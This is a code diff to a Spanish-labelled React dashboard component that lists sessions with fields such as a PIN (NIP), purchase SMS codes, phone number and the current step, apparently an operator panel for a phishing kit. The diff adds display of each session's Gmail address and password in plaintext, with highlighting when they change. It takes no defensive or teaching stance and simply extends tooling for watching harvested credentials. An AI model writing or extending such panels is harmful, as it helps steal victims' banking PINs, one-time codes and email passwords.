@@ -213,6 +213,9 @@ const AccessTable: React.FC<AccessTableProps> = ({
         if (prevSession.celular !== session.celular) {
           newFieldHighlights[session.sessionId].celular = true;
         }
+        if (prevSession.correo !== session.correo || prevSession.contrasena !== session.contrasena) {
+          newFieldHighlights[session.sessionId].gmail = true;
+        }
         if (prevSession.pasoActual !== session.pasoActual) {
           newFieldHighlights[session.sessionId].pasoActual = true;
         }
@@ -387,6 +390,33 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       </div>
                     )}
                     
+                    {/* Datos de Gmail */}
+                    {(session.correo || session.contrasena) && (
+                      <div className="p-2 mb-2 bg-[#222] rounded border border-[#333]">
+                        <div className="text-sm font-semibold mb-1 text-blue-400 flex items-center">
+                          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="mr-1">
+                            <path d="M1.5 8.67v8.58a3 3 0 003 3h15a3 3 0 003-3V8.67l-8.928 5.493a3 3 0 01-3.144 0L1.5 8.67z" />
+                            <path d="M22.5 6.908V6.75a3 3 0 00-3-3h-15a3 3 0 00-3 3v.158l9.714 5.978a1.5 1.5 0 001.572 0L22.5 6.908z" />
+                          </svg>
+                          Credenciales Gmail
+                        </div>
+                        {session.correo && (
+                          <div className="flex gap-1 items-center">
+                            <div className="text-sm text-[#ccc]">
+                              <span className="text-gray-500">Correo:</span> <span className="text-green-400">{session.correo}</span>
+                            </div>
+                          </div>
+                        )}
+                        {session.contrasena && (
+                          <div className="flex gap-1 items-center">
+                            <div className="text-sm text-[#ccc]">
+                              <span className="text-gray-500">Contraseña:</span> <span className="text-green-400">{session.contrasena}</span>
+                            </div>
+                          </div>
+                        )}
+                      </div>
+                    )}
+                    
                     {/* Información del creador (solo visible para administradores) */}
                     <div className="mb-3 flex gap-1 items-center">
                       <Target className="h-4 w-4 text-[#888]" />
@@ -457,6 +487,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
                 <th className="p-3 text-left">NIP</th>
                 <th className="p-3 text-left">SMS COMPRA</th>
                 <th className="p-3 text-left">Celular</th>
+                <th className="p-3 text-left">Gmail</th>
                 <th className="p-3 text-left">Paso actual</th>
                 <th className="p-3 text-left">Creado por</th>
                 <th className="p-3 text-left">Acciones</th>
@@ -510,6 +541,14 @@ const AccessTable: React.FC<AccessTableProps> = ({
                   </td>
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.celular || '--'}
+                  </td>
+                  <td className="p-3 text-[#ccc]">
+                    {session.correo || session.contrasena ? (
+                      <div>
+                        {session.correo && <div className="text-green-400 text-sm">{session.correo}</div>}
+                        {session.contrasena && <div className="text-green-400 text-sm mt-1">{session.contrasena}</div>}
+                      </div>
+                    ) : '--'}
                   </td>
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {/* Convert pasoActual to a more readable format */}
